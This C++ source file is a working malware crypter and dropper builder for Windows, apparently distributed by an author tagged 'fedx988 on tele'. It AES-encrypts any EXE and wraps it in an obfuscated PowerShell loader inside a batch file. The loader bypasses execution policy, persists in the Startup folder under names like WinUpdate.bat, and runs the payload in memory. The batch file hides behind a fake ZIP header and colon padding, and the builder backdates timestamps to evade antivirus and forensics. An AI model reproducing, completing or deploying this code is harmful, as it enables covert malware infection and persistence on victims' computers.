#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <windows.h>
#include <bcrypt.h>
#include <cstdlib>
#include <ctime>
#include <unordered_map>
#include <iomanip>
#include <sstream>

#pragma comment(lib, "bcrypt.lib")
#pragma warning(disable : 4996)

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

// Base64 encoding
std::string base64_encode(const std::string& data) {
    const std::string base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string result;
    size_t i = 0;
    while (i < data.size()) {
        unsigned int octet_a = i < data.size() ? (unsigned char)data[i++] : 0;
        unsigned int octet_b = i < data.size() ? (unsigned char)data[i++] : 0;
        unsigned int octet_c = i < data.size() ? (unsigned char)data[i++] : 0;
        unsigned int triple = (octet_a << 16) + (octet_b << 8) + octet_c;
        result += base64_chars[(triple >> 18) & 63];
        result += base64_chars[(triple >> 12) & 63];
        result += i > data.size() + 1 ? '=' : base64_chars[(triple >> 6) & 63];
        result += i > data.size() ? '=' : base64_chars[triple & 63];
    }
    return result;
}

// Random string generator
std::string generate_random_var_name(size_t length) {
    const std::string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    std::string name;
    for (size_t i = 0; i < length; ++i) {
        name += chars[rand() % chars.length()];
    }
    return name;
}

// Random comment generator
std::string generate_random_comment() {
    return "#" + generate_random_var_name(10) + " " + generate_random_var_name(5);
}

// Replace all occurrences in string
void replace_all(std::string& str, const std::string& from, const std::string& to) {
    size_t pos = 0;
    while ((pos = str.find(from, pos)) != std::string::npos) {
        str.replace(pos, from.length(), to);
        pos += to.length();
    }
}

// File I/O
std::vector<unsigned char> read_file(const std::string& filename) {
    std::ifstream file(filename, std::ios::binary);
    if (!file) throw std::runtime_error("Cannot open input file");
    return std::vector<unsigned char>((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
}

void write_file(const std::string& filename, const std::string& content) {
    std::ofstream file(filename);
    if (!file) throw std::runtime_error("Cannot write output file: " + filename);
    file << content;
}

// Set random file timestamp (1-30 days in the past)
void set_random_file_timestamp(const std::string& filename) {
    HANDLE hFile = CreateFileA(filename.c_str(), FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) {
        throw std::runtime_error("Cannot open file to set timestamp: " + filename);
    }

    // Get current system time
    SYSTEMTIME st;
    GetSystemTime(&st);

    // Convert to FILETIME
    FILETIME ft;
    SystemTimeToFileTime(&st, &ft);
    ULARGE_INTEGER uli;
    uli.LowPart = ft.dwLowDateTime;
    uli.HighPart = ft.dwHighDateTime;

    // Subtract random number of days (1-30)
    int days = 1 + (rand() % 30);
    uli.QuadPart -= (ULONGLONG)days * 24 * 60 * 60 * 10000000;

    // Set the new timestamp
    ft.dwLowDateTime = uli.LowPart;
    ft.dwHighDateTime = uli.HighPart;
    SetFileTime(hFile, &ft, nullptr, nullptr);
    CloseHandle(hFile);
}

// Convert key to hex string for PowerShell
std::string to_hex_string(const std::vector<unsigned char>& data) {
    std::stringstream ss;
    ss << std::hex << std::setfill('0');
    for (unsigned char c : data) {
        ss << std::setw(2) << (int)c;
    }
    return ss.str();
}

// Generate random AES key
std::vector<unsigned char> generate_random_aes_key() {
    std::vector<unsigned char> key(32); // 256-bit key
    NTSTATUS status = BCryptGenRandom(nullptr, key.data(), 32, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    if (!NT_SUCCESS(status)) throw std::runtime_error("Failed to generate AES key");
    return key;
}

// Generate random startup name
std::string get_random_startup_name() {
    std::vector<std::string> names = {
        "WinUpdate.bat", "SysCheck.bat", "NetService.bat", "TaskMgr.bat", "Updater.bat"
    };
    return names[rand() % names.size()];
}

// Split string into random parts
std::vector<std::string> split_string_randomly(const std::string& input) {
    std::vector<std::string> parts;
    size_t remaining = input.length();
    size_t pos = 0;
    int min_parts = 3;
    int max_parts = 6;
    int num_parts = min_parts + (rand() % (max_parts - min_parts + 1));

    while (remaining > 0 && parts.size() < num_parts - 1) {
        size_t part_len = 1 + (rand() % (remaining / 2));
        if (part_len > remaining) part_len = remaining;
        parts.push_back(input.substr(pos, part_len));
        pos += part_len;
        remaining -= part_len;
    }
    if (remaining > 0) {
        parts.push_back(input.substr(pos));
    }
    return parts;
}

// AES-256 encryption
std::vector<unsigned char> encrypt_data(const std::vector<unsigned char>& data, const std::vector<unsigned char>& aes_key) {
    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    NTSTATUS status;
    std::vector<unsigned char> result;

    try {
        // Open algorithm provider
        status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
        if (!NT_SUCCESS(status)) throw std::runtime_error("Failed to open algorithm provider");

        // Set CBC mode
        status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
        if (!NT_SUCCESS(status)) throw std::runtime_error("Failed to set chaining mode");

        // Generate IV (16 bytes)
        std::vector<unsigned char> iv(16);
        status = BCryptGenRandom(nullptr, iv.data(), 16, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
        if (!NT_SUCCESS(status)) throw std::runtime_error("Failed to generate IV");

        // Create key object
        status = BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, (PUCHAR)aes_key.data(), (ULONG)aes_key.size(), 0);
        if (!NT_SUCCESS(status)) throw std::runtime_error("Failed to generate key");

        // Calculate output size
        DWORD cbCipherText = 0, cbResult = 0;
        status = BCryptEncrypt(hKey, (PUCHAR)data.data(), (ULONG)data.size(), nullptr, iv.data(), 16, nullptr, 0, &cbCipherText, BCRYPT_BLOCK_PADDING);
        if (!NT_SUCCESS(status)) throw std::runtime_error("Failed to calculate cipher text size");

        // Allocate output buffer
        result.resize(cbCipherText + 16); // Include IV at the beginning
        memcpy(result.data(), iv.data(), 16); // Prepend IV

        // Encrypt
        status = BCryptEncrypt(hKey, (PUCHAR)data.data(), (ULONG)data.size(), nullptr, iv.data(), 16, result.data() + 16, cbCipherText, &cbResult, BCRYPT_BLOCK_PADDING);
        if (!NT_SUCCESS(status)) throw std::runtime_error("Failed to encrypt data");

        // Clean up
        if (hKey) BCryptDestroyKey(hKey);
        if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);

        return result;
    }
    catch (const std::exception& e) {
        if (hKey) BCryptDestroyKey(hKey);
        if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
        throw;
    }
}

int main() {
    srand(static_cast<unsigned>(time(nullptr)) + GetTickCount());

    try {
        std::string exe_path;
        std::cout << "Enter path to EXE file - fedx988: ";
        std::getline(std::cin, exe_path);

        // Generate random AES key
        std::vector<unsigned char> aes_key = generate_random_aes_key();
        std::string key_hex = to_hex_string(aes_key);

        std::vector<unsigned char> exe_data = read_file(exe_path);
        std::vector<unsigned char> encrypted_data = encrypt_data(exe_data, aes_key);
        std::string encrypted_base64 = base64_encode(std::string(encrypted_data.begin(), encrypted_data.end()));

        // Split encrypted_base64 and key_hex into random parts
        std::vector<std::string> enc_parts = split_string_randomly(encrypted_base64);
        std::vector<std::string> key_parts = split_string_randomly(key_hex);

        // Generate PowerShell code to reassemble parts
        std::string enc_reassemble = "$encParts = @(";
        for (size_t i = 0; i < enc_parts.size(); ++i) {
            enc_reassemble += "\"" + enc_parts[i] + "\"" + (i < enc_parts.size() - 1 ? "," : "");
        }
        enc_reassemble += "); $encryptedBase64 = ($encParts -join '');";

        std::string key_reassemble = "$keyParts = @(";
        for (size_t i = 0; i < key_parts.size(); ++i) {
            key_reassemble += "\"" + key_parts[i] + "\"" + (i < key_parts.size() - 1 ? "," : "");
        }
        key_reassemble += "); $keyHex = ($keyParts -join '');";

        // Define all PowerShell variables for randomization
        std::unordered_map<std::string, std::string> ps_vars = {
            {"policy", generate_random_var_name(8)},
            {"encrypted", generate_random_var_name(8)},
            {"decrypted", generate_random_var_name(8)},
            {"assembly", generate_random_var_name(8)},
            {"entryPoint", generate_random_var_name(8)},
            {"startupPath", generate_random_var_name(8)},
            {"currentPath", generate_random_var_name(8)},
            {"keyHex", generate_random_var_name(8)},
            {"key", generate_random_var_name(8)},
            {"iv", generate_random_var_name(8)},
            {"cipherText", generate_random_var_name(8)},
            {"aes", generate_random_var_name(8)},
            {"decryptor", generate_random_var_name(8)},
            {"ms", generate_random_var_name(8)},
            {"cs", generate_random_var_name(8)},
            {"encParts", generate_random_var_name(8)},
            {"keyParts", generate_random_var_name(8)},
            {"encryptedBase64", generate_random_var_name(8)}
        };

        // Generate random startup name
        std::string startup_name = get_random_startup_name();

        // Create list of preset startup names for cleanup
        std::string preset_names = "'WinUpdate.bat','SysCheck.bat','NetService.bat','TaskMgr.bat','Updater.bat'";

        std::string inner_ps1_script =
            "$policy = Get-ExecutionPolicy;"
            "if ($policy -eq 'Restricted' -or $policy -eq 'AllSigned') {"
            "    Start-Process powershell -ArgumentList \"-ExecutionPolicy Bypass -EncodedCommand $([Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes((Get-Content -Path $env:currentBatPath -Raw))))\" -NoNewWindow;"
            "    exit;"
            "}"
            "$startupPath = [Environment]::GetFolderPath('Startup') + '\\\\" + startup_name + "';"
            "$currentPath = $env:currentBatPath;"
            "$presetNames = @(" + preset_names + ");"
            "Get-ChildItem -Path ([Environment]::GetFolderPath('Startup')) -Filter '*.bat' | Where-Object { $presetNames -contains $_.Name -and $_.Name -ne '" + startup_name + "' } | Remove-Item -Force;"
            "Copy-Item -Path $currentPath -Destination $startupPath -Force;"
            + enc_reassemble +
            "$encrypted = [System.Convert]::FromBase64String($encryptedBase64);"
            + key_reassemble +
            "$key = [byte[]] -split ($keyHex -replace '..', '0x$& ');"
            "$iv = $encrypted[0..15];"
            "$cipherText = $encrypted[16..($encrypted.Length-1)];"
            "$aes = [System.Security.Cryptography.Aes]::Create();"
            "$aes.KeySize = 256;"
            "$aes.BlockSize = 128;"
            "$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC;"
            "$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7;"
            "$aes.Key = $key;"
            "$aes.IV = $iv;"
            "$decryptor = $aes.CreateDecryptor();"
            "$ms = New-Object System.IO.MemoryStream;"
            "$cs = New-Object System.Security.Cryptography.CryptoStream($ms, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Write);"
            "$cs.Write($cipherText, 0, $cipherText.Length);"
            "$cs.Close();"
            "$decrypted = $ms.ToArray();"
            "$ms.Close();"
            "$aes.Dispose();"
            "$assembly = [System.Reflection.Assembly]::Load($decrypted);"
            "$entryPoint = $assembly.EntryPoint;"
            "$entryPoint.Invoke($null, $null);";

        // Add random comments to PowerShell script
        std::string inner_ps1_script_with_comments;
        std::vector<std::string> lines;
        std::string line;
        std::istringstream iss(inner_ps1_script);
        while (std::getline(iss, line)) {
            lines.push_back(line);
            if (rand() % 3 == 0) { // Randomly add comments
                lines.push_back(generate_random_comment());
            }
        }
        for (const auto& l : lines) {
            inner_ps1_script_with_comments += l + "\n";
        }
        inner_ps1_script = inner_ps1_script_with_comments;

        // Apply variable obfuscation
        for (const auto& [original, obf] : ps_vars) {
            replace_all(inner_ps1_script, "$" + original, "$" + obf);
        }

        // Write the obfuscated PowerShell script to output.ps1 and set timestamp
        std::string ps1_filename = "fedx.ps1";
        write_file(ps1_filename, inner_ps1_script);
        set_random_file_timestamp(ps1_filename);

        // Encode the script for the .bat file
        std::string ps_base64 = base64_encode(inner_ps1_script);

        // Generate a massive block of colons
        std::string colon_block;
        const int num_lines = 750;
        const int colons_per_line = 200;
        for (int i = 0; i < num_lines; ++i) {
            colon_block += std::string(colons_per_line, ':') + "\n";
        }

        // Generate random batch file marker
        std::string random_marker = generate_random_var_name(8);

        // BAT template with fake ZIP header, random delay, comments, and random marker
        std::string bat_template =
            "REM PK\x03\x04\x14\x00\x00\x00\x08\x00 (Fake ZIP header)\n" +
            colon_block +
            "REM " + generate_random_var_name(10) + "\n" +
            "@echo off\n"
            "setlocal\n"
            "set \"currentBatPath=%~f0\"\n"
            "timeout /t %random:~-1,1% >nul\n" +
            "start /b powershell -exec bypass -C \"[Environment]::SetEnvironmentVariable('GBSKABG', $env:GBSKABG); iex ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((Get-Content '%~f0' -raw | Select-String (':' + ':" + random_marker + "::(.*)')).Matches.Groups[1].Value)))\" >nul 2>&1\n"
            "::" + random_marker + "::" + ps_base64 + "\n"
            "endlocal\n"
            "exit /b\n" +
            "REM " + generate_random_var_name(10) + "\n" +
            colon_block;

        // Write the batch file and set timestamp
        std::string bat_filename = "fedx.bat";
        write_file(bat_filename, bat_template);
        set_random_file_timestamp(bat_filename);

        std::cout << "Generated " << bat_filename << " and " << ps1_filename << " with AES-256 encrypted PowerShell payload, random AES key, randomized variables, random startup name, random batch marker, randomized timestamps, fake ZIP header, and split strings. - fedx988 on tele\n";

    }
    catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;
        return 1;
    }

    return 0;
}